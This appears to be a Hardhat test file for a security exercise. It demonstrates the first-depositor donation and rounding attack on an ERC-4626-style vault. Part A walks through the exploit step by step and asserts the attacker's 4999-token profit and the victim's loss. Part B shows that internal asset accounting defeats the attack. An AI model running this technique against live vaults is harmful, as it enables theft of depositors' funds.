import { expect } from "chai";
import { network } from "hardhat";

const { ethers } = await network.create();

it("Attacker manipulates share price and profits from rounding", async function () {
    const [admin, attacker, victim] = await ethers.getSigners();

    // ==========================================
    // 1. Deploy contracts
    // ==========================================
    const Token = await ethers.getContractFactory("SimpleERC20", admin);
    const token = await Token.deploy();
    await token.waitForDeployment();

    const tokenAddress = await token.getAddress();

    const Vault = await ethers.getContractFactory("TheVault", admin);
    const vault = await Vault.deploy(tokenAddress);
    await vault.waitForDeployment();

    const vaultAddress = await vault.getAddress();


    // ==========================================
    // 2. Fund attacker and victim
    // ==========================================
    await token.connect(admin).mint(attacker.address, 10001);
    await token.connect(admin).mint(victim.address, 20000);

    // Record attacker's balance BEFORE the attack
    const attackerBalanceBeforeAttack =
        await token.balanceOf(attacker.address);

    console.log(
        "\nAttacker balance before attack:",
        attackerBalanceBeforeAttack.toString()
    );


    // ==========================================
    // ATTACK STEP 1
    // Attacker becomes the first depositor
    //
    // Assets = 1
    // Shares = 1
    // ==========================================
    await token.connect(attacker).approve(vaultAddress, 1);
    await vault.connect(attacker).deposit(1);

    console.log("\nAfter attacker seed:");
    console.log(
        "Vault assets:",
        (await token.balanceOf(vaultAddress)).toString()
    );
    console.log(
        "Vault total shares:",
        (await vault.totalShares()).toString()
    );


    // ==========================================
    // ATTACK STEP 2
    // Attacker directly transfers 10000 tokens
    //
    // Assets = 10001
    // Shares = 1
    // ==========================================
    await token
        .connect(attacker)
        .transfer(vaultAddress, 10000);

    console.log("\nAfter attacker donation:");
    console.log(
        "Vault assets:",
        (await token.balanceOf(vaultAddress)).toString()
    );
    console.log(
        "Vault total shares:",
        (await vault.totalShares()).toString()
    );


    // ==========================================
    // ATTACK STEP 3
    // Victim deposits 20000 tokens
    //
    // shares = (20000 * 1) / 10001
    //        = 1
    // because Solidity integer division truncates
    // ==========================================
    await token.connect(victim).approve(vaultAddress, 20000);
    await vault.connect(victim).deposit(20000);

    const victimShares =
        await vault.shareBalance(victim.address);

    console.log("\nVictim deposited 20000 tokens");
    console.log(
        "Victim received shares:",
        victimShares.toString()
    );

    expect(victimShares).to.equal(1n);


    // Now:
    // Assets = 30001
    // Shares = 2
    expect(await vault.totalShares()).to.equal(2n);

    console.log(
        "Vault assets:",
        (await token.balanceOf(vaultAddress)).toString()
    );

    console.log(
        "Vault total shares:",
        (await vault.totalShares()).toString()
    );


    // ==========================================
    // ATTACK STEP 4
    // Attacker withdraws their 1 share
    //
    // amount = (1 * 30001) / 2
    //        = 15000
    // ==========================================
    await vault.connect(attacker).withdraw(1);

    const attackerBalanceAfterAttack =
        await token.balanceOf(attacker.address);

    console.log(
        "\nAttacker balance after withdrawal:",
        attackerBalanceAfterAttack.toString()
    );


    // ==========================================
    // PROFIT
    //
    // Final - Initial
    // 15000 - 10001 = 4999
    // ==========================================
    const profit =
        attackerBalanceAfterAttack -
        attackerBalanceBeforeAttack;

    console.log(
        "\nATTACKER NET PROFIT:",
        profit.toString(),
        "tokens"
    );

    expect(profit).to.equal(4999n);


    // ==========================================
    // Victim's remaining share value
    // ==========================================
    const remainingAssets =
        await token.balanceOf(vaultAddress);

    const remainingShares =
        await vault.totalShares();

    const victimShareValue =
        (await vault.shareBalance(victim.address))
        * remainingAssets
        / remainingShares;

    console.log(
        "Victim remaining share value:",
        victimShareValue.toString()
    );

    expect(victimShareValue).to.equal(15001n);
});

it("Part B: fixed vault prevents direct donation from manipulating share price", async function () {
    const [admin, attacker, victim] = await ethers.getSigners();

    // ==========================================
    // 1. Deploy token
    // ==========================================
    const Token = await ethers.getContractFactory("SimpleERC20", admin);
    const token = await Token.deploy();
    await token.waitForDeployment();

    const tokenAddress = await token.getAddress();

    // ==========================================
    // 2. Deploy FIXED Vault
    // ==========================================
    const FixedVault = await ethers.getContractFactory(
        "TheVaultFixed",
        admin
    );

    const vault = await FixedVault.deploy(tokenAddress);
    await vault.waitForDeployment();

    const vaultAddress = await vault.getAddress();

    // ==========================================
    // 3. Fund accounts
    // ==========================================
    await token.connect(admin).mint(attacker.address, 10001);
    await token.connect(admin).mint(victim.address, 20000);

    console.log("\n========== FIXED VAULT TEST ==========");


    // ==========================================
    // STEP 1: Attacker seeds with 1
    // ==========================================
    await token.connect(attacker).approve(vaultAddress, 1);
    await vault.connect(attacker).deposit(1);

    console.log(
        "Managed assets after seed:",
        (await vault.totalManagedAssets()).toString()
    );

    expect(await vault.totalManagedAssets()).to.equal(1n);
    expect(await vault.totalShares()).to.equal(1n);


    // ==========================================
    // STEP 2: Attacker repeats direct donation
    // ==========================================
    await token.connect(attacker).transfer(vaultAddress, 10000);

    console.log(
        "Actual token balance after donation:",
        (await token.balanceOf(vaultAddress)).toString()
    );

    console.log(
        "Internal managed assets after donation:",
        (await vault.totalManagedAssets()).toString()
    );

    // Direct donation changed actual balance...
    expect(await token.balanceOf(vaultAddress)).to.equal(10001n);

    // ...but did NOT change accounting
    expect(await vault.totalManagedAssets()).to.equal(1n);


    // ==========================================
    // STEP 3: Victim deposits 20000
    // ==========================================
    await token.connect(victim).approve(vaultAddress, 20000);
    await vault.connect(victim).deposit(20000);

    const victimShares =
        await vault.shareBalance(victim.address);

    console.log(
        "Victim shares after depositing 20000:",
        victimShares.toString()
    );

    // The victim should receive 20000 shares,
    // not 1 share as in the vulnerable contract.
    expect(victimShares).to.equal(20000n);


    // ==========================================
    // STEP 4: Verify attacker cannot profit
    // ==========================================
    await vault.connect(attacker).withdraw(1);

    const attackerFinalBalance =
        await token.balanceOf(attacker.address);

    console.log(
        "Attacker final token balance:",
        attackerFinalBalance.toString()
    );

    // Attacker spent all 10001 tokens:
    // seed = 1 + donation = 10000
    // Their single share is worth only 1 managed token.
    expect(attackerFinalBalance).to.equal(1n);

    console.log(
        "SUCCESS: Direct donation did not manipulate the share calculation."
    );
});